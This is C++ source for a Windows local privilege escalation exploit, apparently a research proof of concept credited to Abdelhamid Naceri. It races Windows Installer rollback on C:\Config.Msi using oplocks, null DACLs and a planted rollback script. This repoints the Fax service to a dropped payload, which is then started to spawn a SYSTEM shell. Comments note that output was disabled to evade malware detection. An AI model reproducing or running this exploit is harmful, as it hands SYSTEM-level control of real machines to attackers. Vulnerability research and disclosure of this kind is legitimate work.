#include "stdafx.h"
#include "FileOpLock.h"
#include <conio.h>
#include "TcpClient.h"
#include "resource.h"
#include <iostream>
#include <AclAPI.h>

#pragma warning(disable : 4996) //silence some compiler warning , I hate them
#define FULL_SHARING FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE
using std::cout;
using std::endl;
using std::cin;
using std::wcout;
using std::wstring;
using std::string;

HANDLE dir = INVALID_HANDLE_VALUE;
HANDLE hFind;
WIN32_FIND_DATA FindFileData;
bool MoveByHandle(HANDLE hfile, const wchar_t* Renamed) {
	auto destFilenameLength = wcslen(Renamed);
	auto bufferSize = sizeof(FILE_RENAME_INFO) + (destFilenameLength * sizeof(wchar_t));
	auto buffer = _alloca(bufferSize);
	memset(buffer, 0, bufferSize);
	auto const fri = reinterpret_cast<FILE_RENAME_INFO*>(buffer);
	fri->ReplaceIfExists = TRUE;
	fri->FileNameLength = destFilenameLength;
	wmemcpy(fri->FileName, Renamed, destFilenameLength);
	if (!SetFileInformationByHandle(hfile, FileRenameInfo, fri, bufferSize))
	{
		return 0;
	}
	else
		return 1;
}
void FindFile(void) {
	do
	{
		hFind = FindFirstFile(L"C:\\Config.Msi\\*.rbs", &FindFileData);
	} while (hFind == INVALID_HANDLE_VALUE);
}
HANDLE hdir = INVALID_HANDLE_VALUE;
void cb() {

	dir = CreateFile(L"C:\\config.msi", WRITE_DAC | READ_CONTROL, FULL_SHARING, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OVERLAPPED
		| FILE_FLAG_OPEN_REPARSE_POINT, 0);
}
DWORD WINAPI thread(void* args) {
	do {

	} while (1);
}
bool success(void) {
	HKEY hk = 0;
	RegOpenKey(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\Fax", &hk);
	LONG dt = MAX_PATH;
	DWORD type = REG_EXPAND_SZ;
	DWORD buff = 256;
	wchar_t data[256];
	RegQueryValueExW(hk, L"ImagePath", 0, &type, (LPBYTE)data, &buff);
	wstring is = data;
	if (is == L"%systemroot%\\Temp\\asmae.exe")
		return 1;
	return 0;
}

int main(int argc, const char* argv[]) {
	HANDLE blah = 0;
	do {

		//lol ms stop detecting my poc as a malware
		//note it seem look like cout or printf take time to execute which result in poc to be failed to whanever
		//cout << "[#] Author : Abdelhamid Naceri\n";
		//cout << "[+] Setting Up Current Process Priority\n";
		SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
		SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
		//move directory if exist
		WCHAR tt3[MAX_PATH];
		GetTempFileName(L"C:\\Windows\\Temp", 0, 0, tt3);
		MoveFileEx(L"C:\\Config.Msi", tt3, MOVEFILE_REPLACE_EXISTING);

		//cout << "[!] Inintializing Resources ..." << endl;

		//msi package resource
		HMODULE hMod = GetModuleHandle(NULL);
		HRSRC msires = FindResource(hMod, MAKEINTRESOURCE(IDR_MSI1), L"msi");
		DWORD msiSize = SizeofResource(hMod, msires);
		void* msiBuff = LoadResource(hMod, msires);
		//payload package inintialization
		HRSRC msires2 = FindResource(hMod, MAKEINTRESOURCE(IDR_MSI2), L"msi");
		DWORD msiSize2 = SizeofResource(hMod, msires2);
		void* msiBuff2 = LoadResource(hMod, msires2);
		//rollback file and rollback script resource
		HMODULE hm = GetModuleHandle(NULL);
		HRSRC res = FindResource(hm, MAKEINTRESOURCE(IDR_RBS1), L"rbs");
		DWORD DllSize = SizeofResource(hm, res);          //resource inintializing
		void* dllBuff = LoadResource(hm, res);
		HRSRC res2 = FindResource(hm, MAKEINTRESOURCE(IDR_RBF1), L"rbf");
		DWORD DllSize2 = SizeofResource(hm, res2);
		void* dllBuff2 = LoadResource(hm, res2);
		DWORD sizeout;
		//this thread will load cpu to make sure we can hit the timming
		DWORD ti = 0;
		bool bthread = false;
		if (!bthread) {
			CreateThread(0, 0, thread, 0, 0, &ti);
			bthread = true;
		}
		//cout << "[+] Creating MSI package In C:\\Windows\\Temp\\asmae.msi ... ";
		HANDLE msipackage = CreateFile(L"C:\\Windows\\Temp\\asmae.msi", GENERIC_WRITE | GENERIC_READ | WRITE_DAC, FULL_SHARING, 0, CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL, 0);
		if (msipackage == INVALID_HANDLE_VALUE) {
			//cout << "\n[-] Error " << GetLastError();
			return 1;
		}
		WriteFile(msipackage, msiBuff, msiSize, &sizeout, NULL);
		//Just To Make sure it's a user readable file
		SetSecurityInfo(msipackage, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION, 0, 0, 0, 0);
		CloseHandle(msipackage);
		//cout << "[!] Uninstalling Package If Exist ...\n";
		system(string("c:\\windows\\system32\\msiexec.exe /x C:\\Windows\\Temp\\asmae.msi /quiet").c_str());
		//cout << "[!] Installing Package If Exist ...\n";
		system(string("c:\\windows\\system32\\msiexec.exe /i C:\\Windows\\Temp\\asmae.msi /quiet").c_str());
		
		//cout << "[!] Launching Package C:\\Windows\\Temp\\asmae.msi For repair ...\n";
		STARTUPINFO si = { 0 };
		PROCESS_INFORMATION pi = { 0 };
		{
			HANDLE c = 0;
			CreateProcess(L"c:\\windows\\system32\\msiexec.exe", L" /fa C:\\Windows\\Temp\\asmae.msi /quiet", 0, 0, 0, 0, 0, 0, &si, &pi);
			do {
				c = CreateFile(L"C:\\config.msi", 0, 0, 0, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, 0);
			} while (c == INVALID_HANDLE_VALUE);
			CloseHandle(c);
			do {
				c = CreateFile(L"C:\\config.msi", 0, 0, 0, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, 0);
			} while (GetLastError() != ERROR_ACCESS_DENIED);
			while (!CreateDirectory(L"C:\\Config.Msi", NULL));
		}
		HANDLE c = 0;
		blah = CreateFile(L"\\??\\C:\\config.msi", WRITE_DAC | READ_CONTROL | GENERIC_READ, FULL_SHARING, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OVERLAPPED
			| FILE_FLAG_OPEN_REPARSE_POINT, 0);
		CreateProcess(L"c:\\windows\\system32\\msiexec.exe", L" /fa C:\\Windows\\Temp\\asmae.msi /quiet", 0, 0, 0, 0, 0, 0, &si, &pi);
		//system(string("start c:\\windows\\system32\\msiexec.exe /fa C:\\Windows\\Temp\\asmae.msi /quiet").c_str());
		//cout << "[+] Directory C:\\Config.Msi Found ...\n";
		//cout << "[!] Waiting C:\\Config.Msi To be deleted ...\n";
		//cout << "[!] Creating C:\\Config.Msi Again ...";
		//cout << "Done !\n";
		//cout << "[+] Locking C:\\config.msi ...";

		//this poc isn't supposed to be working on windows 7
#ifndef _WIN32_WINNT_WIN7 
		FileOpLock* lk = FileOpLock::CreateLock(blah, cb);
		if (lk == nullptr) {
			//cout << "\n[-] Failed To Lock C:\\Config.Msi :(";
			return 1;
		}
		//cout << " Done !\n";
		lk->WaitForLock(INFINITE);
		SetSecurityInfo(dir, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION, 0, 0, 0, 0);
#endif
#ifdef _WIN32_WINNT_WIN7 //there's some issues with win7 and win server 2008
		do {
			HANDLE f = CreateFile(L"\\??\\C:\\config.msi", GENERIC_READ, FULL_SHARING, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS
				| FILE_FLAG_OPEN_REPARSE_POINT, 0);
			if (f == INVALID_HANDLE_VALUE) {
				break;
			}
			CloseHandle(f);
		} while (1);
		SetSecurityInfo(blah, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION, 0, 0, 0, 0);
#endif
		//cout << "[+] OpLock Triggered !\n";
		//cout << "[!] Writting NULL DACL On C:\\config.msi ... Done !\n";//probably it will succeed so lol

		//cout << "[!] Find RollBack Script ...\n";
		FindFile();
		//wcout << "[+] RollBack Script Found \"" << FindFileData.cFileName << "\"\n";
		WCHAR tt[MAX_PATH];
		GetTempFileName(L"C:\\Windows\\Temp", 0, 0, tt);
		//wcout << "[!] Moving C:\\Config.Msi To " << tt << " ... ";

		HANDLE dir2 = CreateFile(L"C:\\config.msi", WRITE_DAC | READ_CONTROL | DELETE, FULL_SHARING, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OVERLAPPED
			| FILE_FLAG_OPEN_REPARSE_POINT, 0);
		//if (dir2 == INVALID_HANDLE_VALUE) {
			//cout << "\n[-] Error " << GetLastError();
		//}
		while (!MoveByHandle(dir2, tt)) {}
		CloseHandle(dir2);
		//cout << "Done !\n";
		//cout<<"[+] Writting RBS and RBF file !\n";
		CreateDirectory(L"C:\\config.msi", 0);
		HANDLE rbs = CreateFile(wstring(L"C:\\config.msi\\" + wstring(FindFileData.cFileName)).c_str(), GENERIC_WRITE, FULL_SHARING, 0, CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL, 0);
		WriteFile(rbs, dllBuff, DllSize, &sizeout, NULL);
		CloseHandle(rbs);
		CloseHandle(blah);
		HANDLE z = CreateFile(L"C:\\config.msi", WRITE_DAC | READ_CONTROL, FULL_SHARING, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OVERLAPPED
			| FILE_FLAG_OPEN_REPARSE_POINT, 0);
		//cout << "[+] Waiting Installer Process To Exit ...\n";
		WaitForSingleObject(pi.hProcess, INFINITE);
		WCHAR tt2[MAX_PATH];
		//cout << "[+] Cleaning Up ...\n";
		GetTempFileName(L"C:\\Windows\\Temp", 0, 0, tt2);
		//set the security descriptor again since we moved the directory
		SetSecurityInfo(z, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION, 0, 0, 0, 0);
		//move the directory to make sure it's not a on time off
		MoveFileEx(L"C:\\Config.Msi", tt2, MOVEFILE_REPLACE_EXISTING);
		//remove the package
		system(string("c:\\windows\\system32\\msiexec.exe /x C:\\Windows\\Temp\\asmae.msi /quiet").c_str());
		//clean up
		DeleteFile(L"C:\\Windows\\Temp\\asmae.msi");
		HANDLE rbf = CreateFileW(L"C:\\Windows\\Temp\\asmae.exe"/*payload*/, GENERIC_WRITE | GENERIC_READ | WRITE_DAC,
			FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL, NULL);
		SetSecurityInfo(rbf, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION | UNPROTECTED_DACL_SECURITY_INFORMATION, 0, 0, 0, 0);
		WriteFile(rbf, dllBuff2, DllSize2, &sizeout, NULL);
		CloseHandle(rbf);
	}while (!success());
	//cout << "[!] Attempting To Spawn SYSTEM Shell ...\n";
	SC_HANDLE sc = OpenSCManager(0, 0, GENERIC_READ);
	SC_HANDLE fax = OpenServiceW(sc, L"Fax", SERVICE_START);
	StartServiceW(fax, 0, 0);
	trigger();
	DeleteFile(L"C:\\Windows\\Temp\\asmae.msi");
	DeleteFile(L"C:\\Windows\\Temp\\asmae.exe");
	
	return 0;
}